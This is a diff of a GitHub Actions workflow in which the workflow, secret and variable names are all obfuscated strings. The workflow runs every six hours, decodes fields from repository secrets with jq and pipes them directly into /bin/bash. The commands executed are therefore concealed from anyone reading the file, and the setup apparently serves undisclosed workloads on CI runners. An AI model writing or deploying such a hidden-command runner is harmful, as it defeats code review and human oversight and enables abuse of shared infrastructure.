@@ -1,8 +1,9 @@
 name: yingongfei2389
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
+    - cron: '17 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,10 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: yingongfei2389
         env:
-          kzfl76: ${{ secrets.kzfl76 }}
+          too5: ${{ secrets.too5 }}
         run: |
-          echo $kzfl76 | jq -r .lf8 | /bin/bash
-          echo $i6 | jq -r .gjb42227 | /bin/bash
-          echo $i20 | jq -r .wml986 | /bin/bash
-          echo $km8417 | jq -r .g8913 | /bin/bash
+          echo $too5 | jq -r .lr54 | /bin/bash
+          echo $zmew3946 | jq -r .rvbh56 | /bin/bash
+          echo $fg55063 | jq -r .vyaq8115 | /bin/bash
 
